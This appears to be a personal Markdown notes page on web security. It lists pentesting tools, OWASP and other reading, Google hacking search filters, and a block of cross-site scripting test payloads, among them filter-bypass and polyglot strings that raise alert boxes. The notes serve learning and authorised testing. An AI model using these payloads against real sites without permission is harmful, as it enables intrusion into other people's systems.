# Security

## Tools

[Base64 Decode and Encode](https://www.base64decode.org/)    
[Wappalyze](https://www.wappalyzer.com/) - Find out the technology stack of a website.  
[SecLists](https://github.com/danielmiessler/SecLists) - A collection of lists used during security assessments.     
[Sublist3r](https://github.com/aboul3la/Sublist3r) - Collects and gathers subdomains for a target domain.    
[fuff](https://github.com/ffuf/ffuf) - Web fuzzer.   
[XSS Hunter](https://github.com/mandatoryprogrammer/xsshunter) - Performs Blind XSS attacks and captures cookies, URLs, page contents.    

## Reading

[OWASP Top 10](https://owasp.org/Top10/)     
[OWASP Web Security Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)      
[Postgres SQL Injection Cheat Sheet](https://pentestmonkey.net/cheat-sheet/sql-injection/postgres-sql-injection-cheat-sheet)    
[Bug Bounty Cheatsheet](https://m0chan.github.io/2019/12/17/Bug-Bounty-Cheetsheet.html)    

## Videos

[A Starters Guide to Pentesting with OWASP](https://www.youtube.com/watch?v=AO_sqXb-gKE)     

## Frameworks

A set of guidelines and best practices to help organizations build and improve their cybersecurity. Frameworks are a blueprint for managing risk and reducing vulnerabilities.

[OWASP](https://owasp.org/)    
[NCSC CAF](https://www.ncsc.gov.uk/collection/caf/caf-principles-and-guidance)    
[NIST](https://www.nist.gov/cyberframework)    

## Notes

### Google Hacking

[Google Hacking](https://en.wikipedia.org/wiki/Google_hacking) is a technique that uses Google Search and other Google applications to find security holes.

| Filter  | Example | 
| ------------- | ------------- | 
| site  | site:example.com  | 
| filetype  | filetype:csv  | 
| inurl  | inurl:admin  | 
| intitle  | intitle:admin  | 

**Example:** "-site:www.example.com site:*.example.com" would only contain results leading to the domain name example.com but exclude any links to www.example.com.

### Cross-site Scripting (XSS)

[OWASP XSS Overview](https://owasp.org/www-community/attacks/xss/)      
[TryHackMe XSS Room](https://tryhackme.com/room/xssgi)

```
<script>alert('XSS');</script>    
"><script>alert('XSS');</script>    
</textarea><script>alert('XSS');</script>    
';alert('XSS');//    
<sscriptcript>alert('XSS');</sscriptcript>    
/images/cat.jpg" onload="alert('XSS');    
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('XSS') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('XSS')//>\x3e    
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert('XSS') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('XSS')//>\x3e    
<iframe src=\"javascript:alert(XSS)\">    
<iframe src="javascript:alert(`XSS`)">    
```


